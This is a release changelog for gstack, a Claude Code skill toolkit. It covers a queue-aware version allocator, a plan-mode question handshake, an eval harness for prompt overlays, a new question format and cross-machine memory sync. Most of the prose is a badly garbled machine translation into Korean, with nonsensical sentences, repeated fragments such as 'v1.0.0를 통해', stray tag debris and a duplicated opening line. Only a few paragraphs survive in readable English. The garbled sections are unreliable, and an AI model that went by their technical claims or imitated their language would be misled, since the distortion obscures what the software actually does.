- Filed 2 P1/P2 `TODOS.md`: 구조 STOP-모든 기술 (계획 모드 입력을 넘어 버그의 넓은 클래스)를 통해 기능들을 강제하고 `interactive: true`를 확장 `/office-hours`, `/codex`, `/investigate`, `/qa`와 같은 비검토 상호 기술에 대한 감사.

## [1.11.0.0] - 2026-04-23

## **Workspace-aware ship. 두 개의 열린 PR은 더 이상 동일한 VERSION를 주장 할 수 없습니다.**

gstack를 한 번에 여러 지휘자 창에서 실행하면, 아마도 본 적이 있습니다. 두 가지 지점은 동일한 버전으로 흠뻑 빠지며, 두 번째를 침묵적으로 겹쳐 쌓이는 것은, `grep "^## \["`가 나중에 `grep "^## \["`가 될 때까지 처음 PR 항목 또는 땅을 덮는 것입니다. 이 릴리스는 건설에 의해 불가능하게 충돌합니다. `/ship`는 이제 열 PR 큐를 쿼리하고, 다음 등급에서 선택된 버전이 무엇인지, 다음 등급에 따라 선택된 것을 볼 수 있습니다. 충돌이 배와 땅 사이에서 감지되면 땅 단계 낙관은 침묵적으로 과잉보다 오히려 `/ship`를 다시 실행하는 것을 알려줍니다. 새로운 `/landing-report` 명령은 수요에 전체 큐를 보여줍니다.

### 당신을 위한 어떤 변화

`/ship`를 다른 하나는 열려있을 때 PR는 v1.7.0.0를 주장하는 동안 한 지휘자 창에서 실행하십시오. 당신의 배는 지금 주장을, queue 테이블을 렌더링하고, 그 위에 다음 자유로운 구멍을 뚫습니다 (사명 범프 수준). PR 제목은 `v<X.Y.Z.W>`로 시작되므로 주문은 `gh pr list`에서 각 PR를 열지 않고 볼 수 있습니다. sibling 작업 공간이 commit에 더 높은 일을 갖지 않는 경우에, (commit는, 또는 마지막에 그것을 위해 기대합니다). 배와 merge 사이 큐 이동이, CI의 새로운 버전 게이트가 그것을 붙잡고, `/ship`를 VERSION, package.json, CHANGELOG, PR 제목이 원자로로로 붙잡는 경우에. 이 아주 풀어 놓는 개는 v1.8.0.0에 있는 본래 배가 처음 착륙될 때, 3개의 다른 PRs가  stale를 갔다, 그리고 결합합니다 v1.0.0를 통해 v1.0.0를 통해 v1.0.0를 통해 v1.0.0를 통해 v1.0.0를 통해 동일한 코드가 나타낸다.

## # 어떤 배송 (번호로)

- `bin/gstack-next-version` - ~390-line Bun/TS util. 21 통과 정착물 시험은 행복한 경로, 8 충돌 시나리오, 오프라인 낙하, 포크-PR 거르는, 활동 탐지, 각자PR 자동 포함을 덮습니다.
- Host 패리티: GitHub + GitLab 모두 지원. CI 문: `.github/workflows/version-gate.yml`, `.github/workflows/pr-title-sync.yml`, 더하기 `.gitlab-ci.yml` 거울.
- util 오류에 실패 열렬한 (네트워크, auth, 버그). gstack 버그가 merge 큐를 얼지 않습니다. 확인 된 충돌에 실패 닫습니다.
- `/landing-report` 기술 - read-only 대쉬보드, sibling, 그리고 모든 4개의 범퍼 레벨이 요구될 것.
- `workspace_root` 구성 키, default `$HOME/conductor/workspaces`, 비응축자 사용자를 위한 sibling 검사를 무능하게 합니다.

### 이 의미는 평행한 작업 공간 실행을 위한

If you're routinely running 3-10 Conductor windows against the same repo, this is the capability that lets the model scale. Before: you mostly got away with it because you noticed collisions by eye. After: the queue is an observable surface, and the system refuses to ship a stale version. `/landing-report` is the new "where am I in line" check when you're about to open PR #6 for the day. Run it before `/ship` if you want to see what's coming without shipping.

### 항목화 된 변경

#### 추가

- `bin/gstack-next-version`. Host-aware (GitHub + GitLab + unknown) VERSION allocator. Queries open PRs, fetches each PR's VERSION at head (bounded concurrency, 10 parallel), scans sibling Conductor worktrees, picks the next free slot. Pure reader, never writes files. Supports `--exclude-pr <N>` to filter out the PR being checked (prevents self-reference when CI runs against the PR's own VERSION).
- `scripts/detect-bump.ts`, `scripts/compare-pr-version.ts`. CI 게이트 헬퍼. 3개의 출구 경로: 통행, 확인된 충돌에 구획, util 과실에 실패 오프닝.
- `.github/workflows/version-gate.yml`. Merge-time 충돌 게이트. VERSION/CHANGELOG/package.json이 PR로 변경할 때 실행됩니다.
- `.github/workflows/pr-title-sync.yml`. VERSION가 push에 변화할 때 자동 rewrites `v<X.Y.Z.W>` 접두사 (자주로 남겨둔 사용자 이름, idempotent)를 나르는 제목을 위해, `.github/workflows/pr-title-sync.yml`.
- `.gitlab-ci.yml`. GitLab CI 패리티. 두 작업 모두 동일한 실패 열려있는 semantics로 미러링.
- `landing-report/SKILL.md.tmpl`. 새로운 `/landing-report` 또는 `/gstack-landing-report` 기술. 읽기 전용 대시보드.
- `bin/gstack-config`. 새로운 `workspace_root` 열쇠. Default `$HOME/conductor/workspaces`, `null`는 주사 검사를 주사할 수 있습니다.

#### 변경

- `ship/SKILL.md.tmpl` 단계 12. FRESH 경로에서 Queue-aware VERSION 후비는 ALREADY_BUMPED 경로에서 탐지를 드리웁니다. 사용자가 전체 메타데이터 경로 (VERSION + package.json + CHANGELOG 헤더 + PR 제목)를 실행하는 재부동에 빠진 경우, atomically는 아무 것도 stale 간다.
- `ship/SKILL.md.tmpl` 단계 19. PR 제목 형식은 `v<X.Y.Z.W> <type>: <summary>`, ALWAYS 첫째 버전입니다. VERSION 변경 시 제목(몸이 아닌)을 업데이트합니다. GitHub 및 GitLab 경로 모두.
- `land-and-deploy/SKILL.md.tmpl`. 새로운 단계 3.4 전 merge 편류 탐지. 자동 자전 파일 보다는 오히려 명확한 rerun-/ship 지시를 가진 분류. Rerunning `/ship`는 가득 차있는 메타데이터 교류를 소유하기 때문에 청결한 경로입니다.
- `review/SKILL.md.tmpl`. 큐 상태를 보여주는 새로운 단계 3.4 자문 1 강선. 비 차단.
- `CLAUDE.md`. invariant 단락을 번역. VERSION는 단색 순서, 엄격한 semver 투입이 아닌, 범람 수준 내의 큐드 배설은 허용됩니다.

#### 고정

- 버전 게이트에 자체 기본 버그. 첫 번째 라이브 CI 실행 (PR #1168 v1.8.0.0)에서 "stale"로 거부되었기 때문에 PR는 큐레이트 주장으로 확인, 다음 슬롯을 팽창. `--exclude-pr` 플래그 + `gh pr view` 자동 감지 그래서 util 침묵으로 현재 branch의 PR의 PR의 <7/>의 C/>는 정확히 개봉에 대한 제어.

#### 기여자

- `test/gstack-next-version.test.ts`. 21 순수한 기능 테스트 (parseVersion / 범선 / cmpVersion / PickNextSlot with 8 충돌 시나리오 / MarkActiveSiblings 4 케이스) 및 CLI 연기 테스트 라이브 리포.
- 골든 배 정착물은 단계 12와 단계 19의 템플렛 변화 후에 모든 3개의 주인 (클래드, 코덱, 공장)를 위해 새로 고침했습니다. 이것은 정확하게 CEO 검토 (크로스 모델 긴장 #8) 도중 블라스트 반경 Codex 끌기, 것과 같이 취급된 동일한 PR에서 뒤에 오는 위로.

## **계획 모드는 침묵적으로 고무 스탬핑을 중단했습니다. 질문은 실제로 불을 겪습니다.**

플랜 모드에서는 `/plan-ceo-review` 또는 어떤 대화형 검토 기술이 있다면, diff를 읽으려면, STOP 게이트를 건너서 플랜 파일을 작성하고, 종료합니다. Zero AskUserQuestion 통화. Zero 모드 선택. Zero per-section 의사 결정. 이 기술 대화형 계약은 플랜 모드의 시스템 제거제에 의해 수행되었으며, 모델이 자체 작업 흐름을 실행하고 모든 것을 무시합니다. 이 릴리스는 어떤 분석 전에 불을 불이 켜지는 preamble-level STOP 문을 추가하므로 항상 대화 형 리뷰를 얻은 기술은 실행하도록 설계되었습니다.

## # 배송

4개의 대화형 검토 기술 (계획소 - 계획, 계획 - eng -review, 계획 - 디자인 -review)는 지금 2 선택권 AskUserQuestion를 방출합니다 순간 계획 형태는 검출됩니다: 출구 및 리런 상호 작용하는, 또는 취소. No 침묵하는 우회. 문은 질문 기입에서 1 방법 문이라고 분류됩니다 그래서 `/plan-tune` 윤곽은 과거에 자동 이형을 할 수 없습니다. Outcome는 `~/.gstack/analytics/skill-usage.jsonl`에 실종 화재가 발생하면, A-exit 및 C-cancel은 엔드-of-run telemetry 블록의 앞에 기술을 종료하는 경우에도 캡처됩니다.

The test harness got a canUseTool extension built on Anthropic's Agent SDK (already installed at v0.2.117). When a test supplies a canUseTool callback, `test/helpers/agent-sdk-runner.ts` flips `permissionMode` from `bypassPermissions` to `default` so the callback actually fires. This is the foundation for asserting AskUserQuestion content end-to-end, which gstack's E2E tests previously couldn't do at all. They had to instruct the model to skip AskUserQuestion entirely. 모든 미래 Interactive-skill 테스트는이에 구축.

### 중요 한 숫자

출처: `test/gen-skill-docs.test.ts` (8개의 시험 덮음 핸디케이션, 부재, 구성 주문, 0C-bis STOP 구획) 및 `test/agent-sdk-runner.test.ts` (6개의 시험 덮음 canUseTool + 허가 형태 + passThrough 돕기). 모든 14는 <250ms, 자유로운 층에서 국부적으로 통행을 통과합니다.

| Surface | 의 전 | 후지후 |
|---|---|---|
| Claude 기술이 핸디케이를 렌더링 | 0 | 4 (계획서, 계획 - eng, 계획 설계, 계획 - devex) |
| Non-Claude 호스트 출력을 손으로 텍스트 | N/A | 0 (`ctx.host === 'claude'` 체크를 통해 호스트스코프) |
| E2E는 AskUserQuestion 내용에 assert 할 수 있는 시험 | 0 | 1개의 마구 primitive, 각 상호 작용하는 기술을 위해 준비하십시오 |
| 4개의 리뷰 기술에 대한 계획 모드 항목 | 공급 업체 | 2 선택권 STOP 문 |
| Step 0C-bis in plan-ceo-review | No STOP 구획은, 0F에 drift 할 수 있었습니다 | Explicit `**STOP.**` 구획 일치 0F 본 |
| Post-handshake telemetry 결과 캡처 | Neither A-exit 또는 C-cancel | 두 (VenPlanMode 전 동기 쓰기) |

### 이 빌더를 위한 뜻

PR 리뷰에서 계획 모드에서 gstack를 실행하면 기술 전에 하나의 질문을 볼 수 있습니다. "Exit plan mode and run interactively, or cancel?" A를 선택하고 esc-esc를 누르면, 정상적인 모드에서 기술을 다시 실행하면 전체 대화 형 리뷰를 얻을 수 있습니다. C를 깨끗하게 가져다. No 더 조용한 고무 스탬프.

새로운 대화형 기술을 구축하는 경우 (gstack), 당신은 지금 실제 E2E 테스트에서 assert에 AskUserQuestion 모양과 canUseTool 마구를 통해 여정을 작성할 수 있습니다. `test/agent-sdk-runner.test.ts` 패턴과 `test/helpers/agent-sdk-runner.ts` API를 참조하십시오.

### 항목화 된 변경

#### 고정

- 플랜 모드 no 더 이상 침묵적으로 AskUserQuestion 게이트를 `/plan-ceo-review`, `/plan-eng-review`, `/plan-design-review`, 또는 `/plan-devex-review`로 건너 뛰고 있습니다. 계획 모드 시스템 제거가 현재 될 때, 어떤 분석 또는 계획 파일 쓰기 전에 사용자 선택을 강제로 첫 번째로 기술이 수행 할 때.
- `/plan-ceo-review` 단계 0C-bis는 이제 단계 0F에 사용된 본을 일치하는 STOP 구획이 있습니다, 그래서 접근 선택 질문은 기술이 계속 형태 선택에 때 침묵적으로 건너 뛰지 않을 수 없습니다.

#### 추가

- 새로운 결의자 `scripts/resolvers/preamble/generate-plan-mode-handshake.ts`는 핸디케이션을 방출하고 텔레메틱스 배쉬를 방출합니다. `ctx.host === 'claude'`를 통해 Claude로 만 호스트를 지정합니다. frontmatter에서 `interactive: true`를 통해 기술 당 Opt-in.
- 기술 템플릿에 새로운 frontmatter 필드 `interactive: boolean`. `scripts/gen-skill-docs.ts`에 의해 파인 발전기 전용 입력은 생성되지 않은 SKILL.md 출력 (`preamble-tier` precedent를 따르십시오).
- `scripts/question-registry.ts`의 `door_type: 'one-way'`를 가진 새로운 질문 등록 `plan-mode-handshake`. 이 문을 억제할 수 없는 문제 다루기 `never-ask` 윤곽.
- `~/.gstack/analytics/skill-usage.jsonl`, `A-exit`, `C-cancel`는, `C-cancel`는, 동시에 핸디케이 불로 썼습니다. end-of-run telemetry 뛰기 전에 기술을 종결할 것이다 붙잡음 결과.
- `test/helpers/agent-sdk-runner.ts`는 선택 `canUseTool` 콜백 매개변수로 확장했습니다. 공급될 때, `permissionMode`를 `default`, 자동 추가 `AskUserQuestion`에 `allowedTools`에, 그리고 SDK에 콜백을 전달합니다. AskUserQuestion에 assert만 원하고 시험을 위한 `passThroughNonAskUserQuestion` 도움자는, 다른 도구를 자동 허용하.

#### 기여자

- `test/gen-skill-docs.test.ts`에서 8개 단위 테스트를 추가했습니다 4개의 상호 작용하는 기술에 있는 핸즈케이 존재를 확인하는, 비결합 기술에 있는 부재, 비결합 주인 산출에 있는 부재, 구성 주문 (handshake precedes 격상시키는 격상시키는 격상시키), 및 0C 비스 STOP 구획 배선.
- `test/agent-sdk-runner.test.ts`에서 6개의 단위 테스트를 추가했습니다 허가 형태 플립, allowedTools 자동 주입, canUseTool callback propagation, 및 통행 대강 도움 행동.
- 새로운 E2E 테스트 표면을 덮는 `test/helpers/touchfiles.ts`에 6개의 문 층 입장을 추가하십시오. 관계되는 기술 템플렛, 핸디케이크 결심자, preamble 구성, 질문 레지스트리, 1 방법 문 분류기, 또는 에이전트 dk-runner 변화의 무엇이든 불능 glob.
- Filed 2 P1/P2 `TODOS.md`: 구조 STOP-모든 기술 (계획 모드 입력을 넘어 버그의 넓은 클래스)를 통해 기능들을 강제하고 `interactive: true`를 확장 `/office-hours`, `/codex`, `/investigate`, `/qa`와 같은 비검토 상호 기술에 대한 감사.

## [1.10.1.0] - 2026-04-23

## **우리는 Opus 4.7 빠른 빠른 빠른 빠른을 만들기 위해 시도. 측정은 느린 것을 얻었다. 총알을 당겨.**

gstack는 v1.5.2.0에서 `model-overlays/opus-4-7.md` 뒤에서 "Fan out 명시적으로" 오버레이 판을 발송했습니다. 아이디어 : Opus 4.7를 차례로 대신 한 개의 보조 회전 대신 여러 도구 통화를 방출하므로 "읽은 세 개의 파일"은 3 대신 API 라운드 스트립을 취합니다. 명백하게 소리가 나옵니다. 이 릴리스는 성능이 적극적으로 상처를 입은 후 총알을 제거하고 우리가 그것을 증명하기 위해 사용되는 eval 하네스를 발송하므로 자체 오버레이 변경을 측정 할 수 있습니다.

### 중요 한 숫자

출처: 새로운 `test/skill-e2e-overlay-harness.test.ts`, 정착물 당 팔 당 N=10 예심, 런 당 40 예심, ~ $ 3. Anthropic의 출판 에이전트 SDK (`@anthropic-ai/claude-agent-sdk@0.2.117`)을 통해 `pathToClaudeCodeExecutable` (`@anthropic-ai/claude-agent-sdk@0.2.117`)를 통해 `claude` 이진 (2.1.118)로 설정. 미터: 평행한 `tool_use` 블록의 수는 첫번째 조수 차례로 켭니다.

| overlay에 있는 Prompt 원본 | 첫 번째 회전 팬 아웃 비율 (toy : 3 파일을 읽으십시오) | 스트레이트 vs baseline |
|---|---|---|
| No 오버레이 (default Claude Code 시스템 프롬프트 전용) | **70%** (7/10) | 기본 정보 |
| gstack의 원래 "Fan out 명시적으로" 판결 (v1.5.2.0 v1.6.3.0을 통해) | 10% (1/10) | **-60%** |
| Anthropic의 자신의 canonical `<use_parallel_tool_calls>` 텍스트에서 병렬 사용 docs | **0%** (0/10) | **-70%** |

현실적인 멀티 파일 감사 프롬프트 (`read app.ts + config.ts + README.md, glob src/*.ts, summarize`)에서 Opus 4.7는 오버레이에 관계없이 모든 첫 차례로 팬을 끄지 않습니다. 20 예심의 제로. 판결은 그립에 아무것도 없었다.

조사의 총 비용 : **$7** 세 가지 eval 실행에 걸쳐.

### 너를 위한 이 뜻

Claude의 시스템 보호 판결을 발송하면 측정합니다. Anthropic의 자체 출판된 최고의 프랙틱 텍스트는 제로에 우리의 팬 아웃 속도를 떨어졌습니다. Anthropic에 대한 주장이 아니라 측정에 대한 주장입니다. 모델, SDK, 바이너리 및 컨텍스트는 조언 아래 모든 움직임을 떨어 뜨리고 조언은 여전히 앉아 있습니다. 하네스는 repo에 있습니다. `EVALS=1 EVALS_TIER=periodic bun test test/skill-e2e-overlay-harness.test.ts`를 실행하십시오. 3 달러당 3 달러를 실행하십시오.

### 항목화 된 변경

#### 고정

- `model-overlays/opus-4-7.md` - "Fan out 명시적으로"블록을 제거.
  다른 세 가지 판사 (편리한 매치, 일괄 질문, 리터 해석)는 이제에 대한 시험과 체류입니다. 그들은 후속 PR에서 자신의 측정에 대한 후보입니다.

#### 추가

- `test/skill-e2e-overlay-harness.test.ts` — 그 시대의 eval은
  `@anthropic-ai/claude-agent-sdk`를 통해 A/B 팔을 타자를 칩니다. SDK를 사용하십시오 `claude_code`를 사용해서 팔은 Claude Code의 진짜 체계 신속한 포함합니다; overlay-ON는 결의된 오바레이 원본을 부칩니다. 법정 회복을 위한 대대 익지않는 사건 시내를 저장하십시오. `EVALS=1`와 `EVALS_TIER=periodic` 둘 다에 Gated.
- `test/fixtures/overlay-nudges.ts` - `OverlayFixture` 레지스트리를 입력
  엄격한 검증자. 측정하는 미래 판독을 추가 = 한 개의 고정 항목. 첫 번째 두 개의 고정 장치 : `opus-4-7-fanout-toy` 및 `opus-4-7-fanout-realistic`.
- `test/helpers/agent-sdk-runner.ts` - 명시된 SDK 래퍼
  `AgentSdkResult` 유형, 공정 수준 API concurrency semaphore, 그리고 세 모양 429 재try (thrown error, result-message error, mid-stream `SDKRateLimitEvent`). `pathToClaudeCodeExecutable`를 통해 이진 피닝.
- `test/agent-sdk-runner.test.ts` — 36개의 자유로운 층 단위 시험
  경로, 모든 세 가지 속도 제한 모양, 지속-429 `RateLimitExhaustedError`, 비-429 전파, 옵션 전파, 통화 캡 및 모든 유효성 검사 케이스.
- `scripts/preflight-agent-sdk.ts` — 20라인 산성 검사
  SDK 로드, `claude-opus-4-7`는 라이브 API 모델, `SDKMessage` 이벤트 모양 일치 가정, 과감한 결심은 예상된 텍스트를 생성합니다. 당신이 무해한 경우에 수동으로 실행하십시오. 비용 ~$0.013.
- `@anthropic-ai/claude-agent-sdk@0.2.117` `devDependencies`. 정확한 핀,
  no 주의 — SDK 이벤트 모양은 미성년자 버전에 드리프트 할 수 있습니다.

#### 변경

- `scripts/resolvers/model-overlay.ts` - 수출 `readOverlay` 그래서 eval
  하네스는 `{{INHERIT:claude}}` 지시어를 전체 `TemplateContext`를 합성하지 않고 해결할 수 있습니다.

#### 기여자

- `test/helpers/touchfiles.ts` — 모두에 새로운 시대를 등록
  `E2E_TOUCHFILES` (deps: `model-overlays/**`, `overlay-nudges.ts`, 주자, 결의자) 및 `E2E_TIERS` (`periodic`). `test/touchfiles.test.ts` 완성 체크를 통과했습니다.
- 하네스는 기하학적입니다. 두 번째 오버레이 판을 추가
  측정 (`opus-4-7.md`, 또는 어떤 오바레이 파일에 있는 미래 진창에 있는 나머지 3개의 진창을 위해)는 `test/fixtures/overlay-nudges.ts`에 있는 단 하나 입장입니다. 총 증가 노력: 정착물 당 ~15 분.

## [1.10.0.0] - 2026-04-23

## **계획 리뷰는 각 문제를 다시 통해 걸어, 모든 질문은 이제 실제 결정적인 간단한 것입니다.**

v1.6.4.0 broke something nobody는 다운 썼습니다. Opus 4.7에 대한 리뷰가 조용히 한 번에 질문을 중지. 그들은 보고서로 바뀌었다 : 여기에 6 개의 발견, 차례의 끝. `/plan-ceo-review`, `/plan-eng-review`, 그리고 나머지 유용한 조용히 증발 된 대화. v1.10.0.0는 그를 복원하고, 형식 업그레이드를 묶습니다. `AskUserQuestion`는 이제 ELI10, 스테이크, 권고, 당 옵션 프로 / cons (✅ / ❌)와 닫힌 "Net:"라인을 사용하여 거래 오프를 하나의 문장으로 프레임시킵니다.

### 당신을 위한 어떤 변화

`/plan-ceo-review` 또는 `/plan-eng-review`를 3개의 발견으로 계획하십시오. 당신은 3개의 분리되는 AskUserQuestion를, 가득 차있는 Pros/Con 모양과 더불어 찾아내서, 1개의 표를 얻습니다. 선택권을 5 초에서 소금시키거나, 그것을 생각하고 싶은 경우에 pros/Cons를 확장하십시오. 모든 검토 발견은 실제로, 당신이 스키마를 치는 탄알이 아닙니다 결정됩니다. 참고 모양은 D2 메모리 디자인 질문 Garry가 자신의 사용을 위해 손으로 제작 한, 이제 preamble 결심자를 통해 모든 계층-2 기술로 구워, 그래서 `/ship`, `/office-hours`, `/investigate`, 나머지는 무료로 상속합니다.

### 중요 한 숫자

v1.10.0.0 수정을 통해 측정. 핀 commit SHA에 대한 `git log 1.9.0.0..1.10.0.0 --oneline` 및 `bun test`와 모든 클레임을 검증합니다.

| Metric | 0.0.4.0 다운로드 | v1.10.0.0의 | Δ |
|---|---|---|---|
| `AskUserQuestion`는 SKILL.md에서 모형 오버레이의 위 연출합니다 | no | **yes** | 주문 거꾸로 |
| 계획 검토 템플릿을 통해 경화 된 Escape-hatch 사이트 | 0 | **16** | +16 |
| Gate-tier 단위 시험은 체재 계약을 핀으로 꼿습니다 | 0 | **30** | +30 (16ms에서 실행, $0) |
| 정기적 인 evals는 탈출을 방어 | 0 | **4** | +4 (2 긍정적, 2 부정적인 케이스) |
| Cross-model 리뷰는 착륙하기 전에 통합되었습니다. | N/A | **5 총 8** | Codex 실제 버그 CEO+Eng 놓은 |

Codex의 두 가지는 로드 베어링이었습니다. (1) 오버레이 주문 이론은 자체에 충분하지 않았습니다. `(recommended)`는 중립 우편 질문에 대한 라벨을 유지해야했기 때문에 `question-tuning.ts:29`는 전원 AUTO_DECIDE에 읽습니다. 그것은 모든 벚꽃 진드기에 자동 변형을 갖게됩니다. (2) 원래 계획에서 "31 사이트 글로벌 대체"는 실제로 잘못되었습니다. `rg`로 확인된 실제적인 조사는, 4개의 템플렛의 맞은편에 16개의 위치이고, CEO 보다는 다른 phrasing를 이용했습니다. 감사 없이, 고침은 반 승인된 발송했습니다.

### Opus 4.7에 대한 모든 사람이 실행 계획 리뷰를 의미

다음 플랜 검토를 업그레이드하고 재 실행하십시오. ELI10 단락, 스테이크 라인 및 ✅ / ❌ 총알 블록 옵션 당. 그렇지 않은 경우, 업그레이드 후 `bun run gen:skill-docs` 재생이 깨끗하게 확인하고 `Pros / cons:` 헤더 렌더링을 확인합니다. `plan-ceo-review/SKILL.md`. 20 분 동안 사용 된 전체 플랜 리뷰 및 10 분의 보고서를 작성하고 10 분의 보고서를 작성하는 데 사용됩니다.

### 항목화 된 변경

#### 추가

- 새로운 Pros / 모든 계층-2 + 기술에 걸쳐 모든 `AskUserQuestion`에 대한 결정 브리프 형식. 렌더링 : `D<N>` 헤더, ELI10, "우리가 잘못을 선택하면 스테이크 :", 추천, 최소 2 프로 + 1 콘, 닫는 `Net:` 종합 라인과 per-option `✅ / ❌` 총알. `scripts/resolvers/preamble/generate-ask-user-format.ts`에 착륙하여 모든 기술이 상속합니다.
- 단방향을 파괴하는 데 어려움을 겪고 있는 하드스톱 탈출: 단일알 `✅ No cons — this is a hard-stop choice`.
- SELECTIVE EXPANSION 체리픽크 및 맛 콜에 대한 중립적 인 자세 처리 : `Recommendation: <default> — this is a taste call, no strong preference either way` `(recommended)` 라벨 default를 유지하려면 AUTO_DECIDE 작업을 유지.
- 3개의 문 층 단위 시험 (`test/preamble-compose.test.ts`, `test/resolver-ask-user-format.test.ts`, `test/model-overlay-opus-4-7.test.ts`)는 구성 순서, 체재 계약 및 오바레이 원본을 핀으로 꼿습니다. 각 `bun test`에 <100ms에서 실행하십시오.
- 4개의 주기적인 층 Pros/Cons 이 페이지는 `test/skill-e2e-plan-prosons.test.ts`의 이 페이지는 이 페이지의 앞에 탈출하 해치 남용을 붙잡는 2개의 부정적인 케이스 assertions를 포함하여 `test/skill-e2e-plan-prosons.test.ts`의 eval 케이스를 전합니다.
- Touchfiles 항목 (`test/helpers/touchfiles.ts`) 모든 새로운 eval 케이스에 대한 추가 기술 7 추가.

#### 고정

- Opus 4.7에 계획 카드 회귀. `/plan-ceo-review`, `/plan-eng-review`, `/plan-design-review`, `/plan-devex-review`는 각각 발견 후 실제로 일시 중지하고 `AskUserQuestion`를 도구로 호출 한 요약 보고서로 일괄 처리하는 대신 도구_use를 호출합니다. 루트 원인 : `generateModelOverlay`는 `generateAskUserFormat`에서 `scripts/resolvers/preamble.ts`, 그래서 오버레이의 "당신의 질문" 지시어를 배치하기 전에 주위 default를 강제하기 전에. 섹션 배열을 재주문하여 "Pace 질문에 기술"으로 오버레이 지침을 재 수정합니다.
- 탈출 해치 붕괴 : "no 문제 또는 수정이 명백하다면, 당신이 할 일 상태와 이동, 4 템플릿을 통해 16 사이트에서 질문을 낭비하지 마십시오 Opus 4.7의 리터 해석자가 자기 허용으로 모든 결과를 분류 할 수 있습니다. 꽉 뚫은 per-template : 0 개의 발견은 "No 문제, 이동"을 가져옵니다. 도구로 AskUserQuestion를 찾는 것은 도구 _ 사용으로 AskUserQuestion를 참조하십시오.

#### 변경

- `test/skill-e2e-plan-format.test.ts`: v1.10.0.0 형식으로 확장 token regexes (D-number, ELI10, Stakes, Pros/cons, Net). RECOMMENDATION 혼합 케이스 "재결을 받아들이기 위해 느슨하게 검사:".
- `test/skill-validation.test.ts`: “RECOMMENDATION: 새로운 Pros/Cons token 세트에 "RECOMMENDATION에서 개정된 형식 assertions.
- 재생되는 황금 정착물: `test/fixtures/golden/claude-ship-SKILL.md`, `codex-ship-SKILL.md`, `factory-ship-SKILL.md`.

#### 기여자

- 외부 청구서 Codex 검토 (`codex exec` 와 `model_reasoning_effort="high"`) 원래 계획에서 두 실제 버그를 잡았다: "31 사이트" 카운트 (실제 16) 및 AUTO_DECIDE 계약은 중립 우편 질문에 대한 휴식. 8 Codex의 5 통합, 1 거부 (구체 주문에 깊이에서 방어), 1 감소 (HOLD SCOPE 자물쇠 모드).
- 팔로워: 진실한 다 회전 cadence eval (3개의 발견은 회전의 맞은편에 3개의 명백한 AskUserQuestion invocations를 생성합니다)는 다 모이를 위한 새로운 마구 지원을 요구합니다. NOT에서 신청해. 현재 단 하나 모이는 eval 덮개 체재 + 탈출하 붙잡는 남용은 그러나 cadence 자체.
- 팔로워: `/ship`, `/office-hours`, `/investigate`, `/qa`, `/review`, `/design-review`, `/document-release`를 위한 확장 커버리지 eval 케이스. 접촉파일 입장은 존재합니다; 시험 구획은 후속 PR에 있는 경작을 땅에 답니다.
- D-numbering은 모델 레벨의 지시, 실행 시간 카운터가 아닙니다. `TemplateContext`는 no 상태를 가지고 있습니다. 긴 세션 이상 드리프트가 예상됩니다; 레지스트리 (ToDOs에 철거)는 장기적인 수정입니다.

## [1.9.0.0] - 2026-04-23

## **gstack 기억은 지금 당신과 함께 여행합니다. 개인 git repo + 선택 GBrain 색인을 붙이는, no daemon, no 압흔 누출을 통해 교차 기계 뇌.**

gstack session memory (learnings, plans, designs, retros, developer profile) used to die at the machine boundary. Now it doesn't. `gstack-brain-init` turns `~/.gstack/` into a git repo with an explicit allowlist, writer shims enqueue changed files at write-time, and a preamble-boundary sync pushes them to a private git remote of your choice. GBrain is the first consumer but the architecture is pluggable — Codex, OpenClaw, or anything else can be a reader later. No daemon, no background process, no new auth surface.

4개의 계획 리뷰 후에 발송되는 특징: /office-hours 형성, /plan-eng-review (6개의 문제점 → CLEAR), /plan-ceo-review (SELECTIVE EXPANSION, 2개의 체리 픽크 수락), /codex 두번 (16+16의 발견 적용된, daemon 모형은 둥근 2)에서 떨어졌습니다, 그리고 /plan-devex-review (6/10년, docs는 가득 차있는 처리에 올랐습니다). Codex의 범위 단순화는 Codex의 1 주일 후에, 떨어집니다.

### 지금 할 수있는 일

- **크로스 머신 동기화를 초기화:** `gstack-brain-init`는 `gh`를 통해 GitHub, 또는 URL — GitLab, Gitea, self-hosted)를 개인 git repo(GitHub)를 생성합니다. 30-90 초 TTHW.
- **어제의 노트북을 오늘 데스크탑에서보십시오 :** 복사 `~/.gstack-brain-remote.txt` 새 기계에, 실행 `gstack-brain-restore`, 당신의 학습은 당신을 따르.
- **동기화를 제어:** 첫 번째 실행에 한 번 개인 정보 보호 중지 - `full` (각각 허용), `artifacts-only` (plans/designs/retros/learnings, 건너뛰기 행동), `off` (decline).
- **분쟁 사례를 통해 수면:** 두 개의 기계가 같은 JSONL 파일을 동일한 날 merge를 ts-sort-plus-hash-fallback merge 드라이버를 통해 자동으로 기록했습니다.
- **청소하게 제거:** `gstack-brain-uninstall`는 동기화 층을 제거하고, 당신의 자료 intact를 나타냅니다.
- **절대 push 비밀:** AWS 열쇠, GitHub 토큰 (`ghp_`/`gho_`/`ghu_`/`ghs_`/`ghr_`/`github_pat_`), OpenAI `sk-` 열쇠, PEM 구획, JWTs, 그리고 Bearer-token-JSON 본은 모두 푸시 전에 차단됩니다. `--skip-file <path>`는 당신에게 단 하나 hatchd를 위해 긍정을 줍니다.

### 중요 한 숫자

소스: 구현 중 통합 연기 테스트, 플러스 27 테스트 통합 스위트 (`test/brain-sync.test.ts`). 끝-에-엔드 왕복 (기계 A → 쓰기 학습 → 기계 B에 복원 → 학습 참조) 확인 인라인.

| Surface | 의 특징 |
|---|---|
| 새로운 binaries | 8 (`gstack-brain-init`, `-enqueue`, `-sync`, `-consumer`, `-reader` 별명으로, `-restore`, `-uninstall`, `gstack-jsonl-merge`) |
| Config 열쇠 | 2 (`gbrain_sync_mode`: off/artifacts-only/full; `gbrain_sync_mode_prompted`: 불) |
| 작성자 shims 수정 | 4 (learnings-log, 타임라인 로그인, 리뷰 로그, 개발자 프로필 --migrate path) |
| NOT 동기화 | 2 (question-log, 질문-preference — per-machine UX state, Codex v2 결정) |
| Sync 과립 | `gstack-brain-sync --once`를 통해 per-skill-boundary (no daemon) |
| tiers의 특징 | 3 (전체 / 사실 만 / 끄기) |
| 비밀 패턴 블록 | 6 가족 (AWS, GH 토큰, OpenAI, PEM, JWT, Bearer-in-JSON) |
| 사용자 중심의 | `reader` (CLI); 내부 데이터 모델은 Codex-v2 DX 결정 당 `consumer`를 유지합니다. |
| 새로운 기계 발견 | `~/.gstack-brain-remote.txt` 파일 (URL-only, no 비밀)를 통해 자동 |

### 너를 위한 이 뜻

